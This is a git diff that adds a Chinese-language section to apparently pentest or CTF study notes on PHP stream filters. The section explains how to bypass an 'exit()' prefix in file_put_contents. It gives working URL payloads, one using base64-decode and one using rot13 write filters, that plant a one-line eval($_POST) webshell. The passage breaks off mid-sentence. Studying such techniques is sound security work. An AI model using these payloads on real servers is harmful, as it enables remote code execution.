@@ -190,6 +190,7 @@ index.php?file1=php://filter/resource=file.txt
 
 # 编码读取
 index.php?file=php://filter/read=covert.base64-encode/resource=file.txt
+
 ```
 
 * 写入文件
@@ -313,3 +314,50 @@ crypt.*和 mdecrypt.*使用 libmcrypt 提供了对称的加密和解密。这两
 细则查看加密方式：
 
 https://www.php.net/manual/zh/filters.encryption.php
+
+
+
+## 死亡绕过
+
+1. bypass不同变量
+
+```
+<?php $filename=$_GET['filename']; 
+
+$content=$_GET['content'];
+
+file_put_contents($filename,"<?php exit();".$content);
+```
+由于在文件写入之前，添加了exit，导致我们写入的php一句话无法执行
+
+
+绕过方法:
+
+* 利用php协议，对所要写入的文件作出规定，比如exit()是和我们输入的内容一起写入的，那么利用过滤器，可以一起对输入的文件流作出过滤
+
+构建payload:
+
+```
+?filename=php://filter/convert.base64-decode/resource=a.php&content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==
+
+```
+
+因此，这种情况下，exit()语句同样被进行了base64解码，但是我们输入的php语句是经过base64加密的，因此，一旦解密就成了一句话木马。。。。
+
+
+rot13绕过
+
+* str_rot13()
+
+str_rot13()函数对字符进行移动13位，第一次移动改变，再移动一次，返回原字符
+
+ <?php exit; 在经过rot13编码后会变成 <?cuc rkvg(); ，不过这种利用手法
+的前提是PHP不开启short_open_tag。
+
+```
+?filename=php://filter/write=string.rot13/resource=2.php&content=<?cuc riny($_CBFG[n]);
+```
+直接写入
+
+
+注意：在关闭 short_open_tag = Off 的情况下，可以
